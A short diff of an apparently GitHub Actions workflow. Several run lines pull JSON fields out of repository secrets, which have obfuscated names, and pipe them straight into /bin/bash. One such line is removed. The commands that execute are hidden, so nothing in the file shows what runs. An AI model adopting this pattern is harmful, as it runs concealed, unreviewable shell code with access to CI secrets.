@@ -23,7 +23,6 @@ jobs:
           tkkfj86875: ${{ secrets.tkkfj86875 }}
         run: |
           printf '%s' "$tkkfj86875" | jq -r .ari6 | /bin/bash
-          echo $eww1304 | jq -r .z926 | /bin/bash
           echo $ail1 | jq -r .webhc282 | /bin/bash
           printf '%s' "$qwe82" | jq -r .pauas61040 | /bin/bash
           echo $wcy34446 | jq -r .bl1812 | /bin/bash
